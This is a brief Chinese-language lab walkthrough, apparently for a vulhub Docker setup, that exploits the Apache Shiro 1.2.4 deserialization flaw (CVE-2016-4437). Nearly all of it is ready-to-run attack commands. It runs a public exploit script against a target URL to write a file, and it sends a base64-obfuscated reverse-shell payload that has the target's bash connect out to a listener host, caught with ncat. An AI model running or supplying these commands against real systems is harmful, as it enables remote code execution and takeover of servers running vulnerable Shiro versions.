# Apache Shiro 1.2.4反序列化漏洞(CVE-2016-4437)写文件

Apache Shiro是一款开源安全框架，提供身份验证、授权、加密和企业会话管理等功能。Shiro 框架直观、易用,同时拥有足够的安全性。

```
git clone https://github.com/vulhub/vulhub.git
cd vulhub
docker-compose build
docker-compose up -d
```



```
git clone https://github.com/insightglacier/Shiro_exploit.git
cd Shiro_exploit
python shiro_exploit.py -t 3 -u http://10.0.0.202:8080 -p "touch /tmp/123321"
```

反弹shell

```
http://www.jackson-t.ca/runtime-exec-payloads.html
```



```
 python shiro_exploit.py -t 3 -u http://10.0.0.202:8080 -p "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2OC4xMDgvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}"
```

```
 ncat -l 1234
```

```
docker-compose down 关闭环境
```

